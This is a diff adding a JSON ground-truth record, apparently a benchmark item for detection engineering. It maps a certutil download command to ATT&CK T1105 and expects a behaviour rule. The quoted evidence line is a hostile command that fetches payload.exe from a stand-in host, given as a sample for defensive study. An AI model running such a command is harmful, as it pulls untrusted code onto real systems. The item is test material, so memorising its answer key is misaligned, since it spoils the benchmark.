@@ -1,0 +1,27 @@
+{
+  "report_id": "report_021",
+  "complexity": "medium",
+  "ground_truth": {
+    "evidence": [
+      {
+        "quote": "cmd.exe /c certutil -urlcache -split -f http://example/payload.exe",
+        "start_offset": 0,
+        "end_offset": 68,
+        "category": "payload_download"
+      }
+    ],
+    "attack_mapping": [
+      {
+        "technique_id": "T1105",
+        "confidence": "high"
+      }
+    ],
+    "required_telemetry": ["process_creation"],
+    "allowed_fields": ["CommandLine", "Image", "ParentImage"],
+    "detection_logic": {
+      "description": "Detect certutil-based payload retrieval behavior"
+    },
+    "expected_decision": "behavior_rule",
+    "abstain_reason": null
+  }
+}
